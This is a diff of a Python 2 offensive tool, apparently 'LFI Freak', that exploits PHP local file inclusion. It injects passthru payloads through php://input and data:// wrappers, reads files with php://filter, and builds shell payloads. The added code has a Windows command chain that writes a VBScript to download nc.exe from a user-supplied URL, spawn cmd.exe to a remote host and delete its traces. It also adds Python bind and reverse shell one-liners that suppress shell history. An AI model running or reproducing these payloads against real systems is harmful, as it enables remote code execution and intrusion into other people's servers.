@@ -1,9 +1,10 @@
 from __future__ import print_function
 from bs4 import BeautifulSoup
-import requests
 import urllib2
 import urllib
+import random
 import base64
+import string
 import sys
 import os
 import re
@@ -13,11 +14,12 @@ import re
 # My own logic and own code ;)
 
 class lfi(object):
-	def __init__(self, url=None, cookie=None, command=None, files=None):
+	def __init__(self, url=None, cookie=None, command=None, files=None, isShell=None):
 		self._url = str(url)
 		self._cookie = cookie
 		self._command =  command
 		self._files = files
+		self._isShell = isShell
 
 	@property
 	def url(self):
@@ -35,6 +37,10 @@ class lfi(object):
 	def files(self):
 		return self._files
 
+	@property
+	def isShell(self):
+		return self._isShell
+
 	@url.setter
 	def url(self, url):
 		self._url = url
@@ -50,6 +56,10 @@ class lfi(object):
 	@files.setter
 	def files(self, files):
 		self._files = files
+
+	@isShell.setter
+	def isShell(self, isShell):
+		self._isShell = isShell
 	
 	@url.deleter
 	def url(self):
@@ -69,19 +79,22 @@ class lfi(object):
 
 	def test(self):
 		vul = []
-		self._command = 'echo CGQAwiEGmE'
-		if self.phpInput() == ' \r\nCGQAwiEGmE\r\n': vul.append("PHP://input")
-		if self.dataURI() == ' \r\nCGQAwiEGmE\r\n': vul.append("dataURI")
+		rnd = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
+		self._command = 'echo %s' %rnd
+		if self.phpInput() == ' \r\n%s\r\n'%rnd: vul.append("PHP://input")
+		if self.dataURI() == ' \r\n%s\r\n'%rnd: vul.append("dataURI")
 		print ('[*] Target is vulnerable to: \n')
 		for i, j in enumerate(vul, start=1): print (i, j)
-		choice = int(input("\nEnter a choice: "))
+		choice = int(input("\n[*] Enter a choice: "))
 		command = str(input("Enter your command: ")) 
 		if choice == 1: pass
 		if choice == 2: pass
 		if choice == 3: pass	
 	
 	def phpInput(self):
-		mydata = "<?php passthru('echo CGQAtiDhmE &" + self._command + "& echo CGQAtiDhmE'); ?>"    #The first is the var name the second is the value
+		rnd = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
+		mydata = ("<?php passthru('echo {0} &" + self._command + "& echo {0}'); ?>").format(rnd) if self._isShell else \
+		("<?php passthru('" + self._command + "'); ?>")
 		path = self._url + 'php://input'    #the url you want to POST to
 		req = urllib2.Request(path, mydata)
 		req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14')
@@ -90,13 +103,13 @@ class lfi(object):
 		try: page = urllib2.urlopen(req)
 		except urllib2.HTTPError as e: print ('Response code: '+e.code)
 		html = BeautifulSoup(page.read(), 'lxml')
-		match = re.search(r'CGQAtiDhmE(.+?)CGQAtiDhmE', html.text, flags=re.DOTALL)
+		match = re.search(rnd+r'(.+?)'+rnd, html.text, flags=re.DOTALL)
 		try: return (match.group(1))
 		except: return ("[!] Error Occured")
 		page.close()
 
 	def phpFilter(self):
-		path = self.self._url + 'php://filter/convert.base64-encode/resource=' + self._files   #the url you want to POST to
+		path = self._url + 'php://filter/convert.base64-encode/resource=' + self._files   #the url you want to POST to
 		req = urllib2.Request(path)
 		req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14')
 		req.add_header("Content-type", "application/x-www-form-urlencoded")
@@ -110,7 +123,8 @@ class lfi(object):
 		page.close()
 
 	def dataURI(self):
-		payload = ("<?php passthru('echo CGQAtiDhmE &" + self._command + "& echo CGQAtiDhmE'); ?>").encode('base64').replace('\n','') 
+		rnd = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
+		payload = ("<?php passthru('echo {0} &" + self._command + "& echo {0}'); ?>").format(rnd).encode('base64').replace('\n','') 
 		path = self._url + 'data://text/plain;base64,'+payload   #the url you want to POST to
 		req = urllib2.Request(path)
 		req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14')
@@ -119,18 +133,18 @@ class lfi(object):
 		try: page = urllib2.urlopen(req)
 		except urllib2.HTTPError as e: print ('Response code: '+e.code)
 		html = BeautifulSoup(page.read(), 'lxml')
-		match = re.search(r'CGQAtiDhmE(.+?)CGQAtiDhmE', html.text, flags=re.DOTALL)
+		match = re.search(rnd+r'(.+?)'+rnd, html.text, flags=re.DOTALL)
 		try: return (match.group(1))
 		except: return ("[!] Error Occured")
 		page.close()
 
 class Payload(object):
-	def __init__(self, url=None, port=None, ip=None, shell=None):
+	def __init__(self, url=None, port=None, ip=None, shell=None, location=None):
 		self._url = url
 		self._port = port
 		self._ip = ip
 		self._shell = shell
-		#self._location = location
+		self._location = location
 
 	@property
 	def url(self):
@@ -147,7 +161,11 @@ class Payload(object):
 	@property
 	def shell(self):
 		return self._shell
-
+	
+	@property
+	def location(self):
+		return self._location
+	
 	@url.setter
 	def url(self, url):
 		self._url = url
@@ -158,11 +176,15 @@ class Payload(object):
 
 	@ip.setter
 	def ip(self, ip):
-		self._ip = ip	
+		self._ip = ip
 
 	@shell.setter
 	def shell(self, shell):
 		self._shell = shell	
+
+	@location.setter
+	def location(self, location):
+		self._location = location
 
 	@url.deleter
 	def url(self):
@@ -180,94 +202,130 @@ class Payload(object):
 	def shell(self):
 		del self._shell 
 
-	def payload(self):
+	@location.deleter
+	def location(self):
+		del self._location
+
+	def payload_windows(self):
 		nc=('nc.exe %s') %(self._ip) if self._shell=='reverse' else 'nc.exe -lvvp'
-		payload =("echo strFileURL = \"{0}\" > down.vbs& \
-			echo strHDLocation = \"nc.exe\" >> down.vbs& \
-			echo Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\") >> down.vbs& \
-			echo objXMLHTTP.open \"GET\", strFileURL, false >> down.vbs& \
-			echo objXMLHTTP.send() >> down.vbs& \
-			echo If objXMLHTTP.Status = 200 Then >> down.vbs& \
-			echo Set objADOStream = CreateObject(\"ADODB.Stream\") >> down.vbs& \
-			echo objADOStream.Open >> down.vbs& echo objADOStream.Type = 1 >> down.vbs& \
-			echo objADOStream.Write objXMLHTTP.ResponseBody >> down.vbs& \
-			echo objADOStream.Position = 0 >> down.vbs& \
-			echo Set objFSO = Createobject(\"Scripting.FileSystemObject\") >> down.vbs& \
-			echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> down.vbs& \
-			echo Set objFSO = Nothing >> down.vbs& \
-			echo objADOStream.SaveToFile strHDLocation >> down.vbs& \
-			echo objADOStream.Close >> down.vbs& \
-			echo Set objADOStream = Nothing >> down.vbs& \
-			echo End if >> down.vbs& \
-			echo Set objXMLHTTP = Nothing >> down.vbs& \
-			echo Set objShell=CreateObject(\"WScript.Shell\") >> down.vbs& \
-			echo objShell.Run \"{1} {2} -e \"\"cmd.exe\"\" \", 0, true >> down.vbs& \
-			call down.vbs").format(
-			self._url, 
-			#self._location, 
-			nc, 
-			self._port
-			)
+		payload =("del /f /q \"{1}down.vbs\" > nul& \
+			del /f /q \"{1}nc.exe\" > nul& \
+			echo strFileURL = \"{0}\" > \"{1}down.vbs\"& \
+			echo strHDLocation = \"{1}nc.exe\" >> \"{1}down.vbs\"& \
+			echo Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\") >> \"{1}down.vbs\"& \
+			echo objXMLHTTP.open \"GET\", strFileURL, false >> \"{1}down.vbs\"& \
+			echo objXMLHTTP.send() >> \"{1}down.vbs\"& \
+			echo If objXMLHTTP.Status = 200 Then >> \"{1}down.vbs\"& \
+			echo Set objADOStream = CreateObject(\"ADODB.Stream\") >> \"{1}down.vbs\"& \
+			echo objADOStream.Open >> \"{1}down.vbs\"& \
+			echo objADOStream.Type = 1 >> \"{1}down.vbs\"& \
+			echo objADOStream.Write objXMLHTTP.ResponseBody >> \"{1}down.vbs\"& \
+			echo objADOStream.Position = 0 >> \"{1}down.vbs\"& \
+			echo Set objFSO = Createobject(\"Scripting.FileSystemObject\") >> \"{1}down.vbs\"& \
+			echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> \"{1}down.vbs\"& \
+			echo Set objFSO = Nothing >> \"{1}down.vbs\"& \
+			echo objADOStream.SaveToFile strHDLocation >> \"{1}down.vbs\"& \
+			echo objADOStream.Close >> \"{1}down.vbs\"& \
+			echo Set objADOStream = Nothing >> \"{1}down.vbs\"& \
+			echo End if >> \"{1}down.vbs\"& \
+			echo Set objXMLHTTP = Nothing >> \"{1}down.vbs\"& \
+			echo Set objShell=CreateObject(\"WScript.Shell\") >> \"{1}down.vbs\"& \
+			echo objShell.Run \"{1}{2} {3} -e \"\"cmd.exe\"\" \", 0, true >> \"{1}down.vbs\"& \
+			call \"{1}down.vbs\"& \
+			del /f /q \"{1}down.vbs\" > nul& \
+			del /f /q \"{1}nc.exe\" > nul").format(
+											self._url, 
+											self._location, 
+											nc, 
+											self._port
+											)
 
 		return payload
+
+	def payload_linux_python(self):
+		if self._shell == 'bind':
+			payload=('python -c "import os,pty,socket;\
+				s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.bind((\\\'\\\',{0}));s.listen(1);\
+				(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);\
+				os.dup2(rem.fileno(),2);os.putenv(\\\'HISTFILE\\\',\\\'/dev/null\\\');\
+				pty.spawn(\\\'/bin/bash\\\');s.close()"').format(self._port)
+
+			return payload
+
+		else:
+			payload=('python -c "import socket,subprocess,os; \
+				s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\
+				s.connect((\\\'{0}\\\',{1}));os.dup2(s.fileno(),0); \
+				os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);\
+				p=subprocess.call([\\\'/bin/sh\\\',\\\'-i\\\']);"').format(self._ip, self._port)
+
+			return payload
+
 
 def shells(method, shell):
 	shellObj = Payload()
 	shellObj.shell = str(shell) # bind or reverse
+	shellObj.isShell = True
 	print('''
 [*] Choose an OS 
 1. Windows
 2. Linux
 ''')
 	choice = int(input('>> '))
-	if method == 'phpInput':
-		if choice == 1 and shell == 'bind':
-			shellObj.url = str(input("[*] Enter the download URL of netcat: "))
-			shellObj.port = str(input("[*] Enter the port to bind: "))
-			print('[+] Connect on %s port %s') %(shellObj.ip, shellObj.port)
-			payload = shellObj.payload()
-			lfiObj.command = payload
-			
+	if choice == 1:
+		shellObj.url = str(input("[*] Enter the download URL of netcat: "))
+		shellObj.location = str(input("[*] Enter the location to be saved\n(Press enter for the default location): "))
+	if shell == 'reverse':
+		shellObj.ip = str(input("[*] Enter your IP: "))
+		shellObj.port = str(input("[*] Enter listening port: "))
+	else: shellObj.port = str(input("[*] Enter the port to bind: "))
+	#print('[+] Connect on port {0}').format(shellObj.port)
+	if choice == 1: payload = shellObj.payload_windows()
+	if choice == 2: payload = shellObj.payload_linux_python()
+	lfiObj.command = payload
+		
 
-#nc -lvvp 4444 -e "cmd.exe"
-#nc.exe 192.168.1.5 4444 -e "cmd.exe"
 
 def com(method):
-	print ('''
-[?] Choose an option:
-1. Execute command
-2. Bind Shell
-3. Reverse Shell
-''')
+	if method == 'phpInput':
+		bind = "2. Bind Shell"
+		rev = "3. Reverse Shell"
+	
+	else:
+		rev = '' 
+		bind = ''
+	
+	menu = ("[?] Choose an option:\n%s\n%s\n%s\n") %("1. Execute command",
+													bind,
+													rev)
+	print(menu)
 	choice = int(input(">> "))
 	if choice == 1: lfiObj.command = str(input("[*] Enter your command: "))
-	elif choice == 2: shells(method, 'bind')
-	elif choice == 3: shells(method, 'reverse')
+	elif choice == 2 and method == 'phpInput': shells(method, 'bind')
+	elif choice == 3 and method == 'phpInput': shells(method, 'reverse')
 
-
-#powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback= {$true}; $source="""http://192.168.1.5/nc.exe """; $destination= """C:\\nc.exe"""; $http = new-object System.Net.WebClient; $response= $http.DownloadFile($source, $destination);"
 try: input = raw_input
 except: pass
 
 cls = lambda: os.system('cls') if os.name == 'nt' else os.system('clear')
+
 lfiObj = lfi()
 
 def banner():
 	print('''
 
-888     888~~  ,e,   
-888     888___  "    
-888     888    888   
-888     888    888   
-888     888    888   
-888____ 888    888  
+,--.   ,------.,--.
+|  |   |  .---'`--'
+|  |   |  `--, ,--.
+|  '--.|  |`   |  |
+`-----'`--'    `--'
 
-		888~~                             888   _   
-		888___ 888-~\  e88~~8e    /~~~8e  888 e~ ~  
-		888    888    d888  88b       88b 888d8b    
-		888    888    8888__888  e88~-888 888Y88b   
-		888    888    Y888    , C888  888 888 Y88b  
-		888    888     "88___/   "88_-888 888  Y88b 
+		,------.                      ,--.    
+		|  .---',--.--. ,---.  ,--,--.|  |,-. 
+		|  `--, |  .--'| .-. :' ,-.  ||     / 
+		|  |`   |  |   \   --.\ '-'  ||  \  \ 
+		`--'    `--'    `----' `--`--'`--'`--'
+                                              
 
 [*] Author: Osanda Malith Jayathissa
 [*] E-Mail: osanda[cat]unseen.is
@@ -293,18 +351,20 @@ def main():
 5. Exit
 ''')
 			try: choice = int(input(">> "))
+
 			except ValueError:
 				print ("[!] Enter only a number")
 				continue
 
 			if choice == 1: lfiObj.test()
+
 			elif choice == 2:
 				com('phpInput')
 				print (lfiObj.phpInput())
 
 			elif choice == 3:
-				files =  str(input("Enter the file path: "))
-				print (lfiObj.phpFilter(files))
+				lfiObj.files =  str(input("Enter the file path: "))
+				print (lfiObj.phpFilter())
 			
 			elif choice == 4:
 				com('dataURI')
@@ -314,14 +374,14 @@ def main():
 
 			else:
 				print ("[-] Invalid Choice")
-		    	continue
+				continue
 
 	except KeyboardInterrupt:
-		print ('[!] Ctrl + C detected\n[!] Exiting')
+		print ('\n[!] Ctrl + C detected\n[!] Exiting')
 		sys.exit(0)
 		
 	except EOFError:
-		print ('[!] Ctrl + D detected\n[!] Exiting')
+		print ('\n[!] Ctrl + D detected\n[!] Exiting')
 		sys.exit(0)
 
 if __name__ == "__main__": main()  
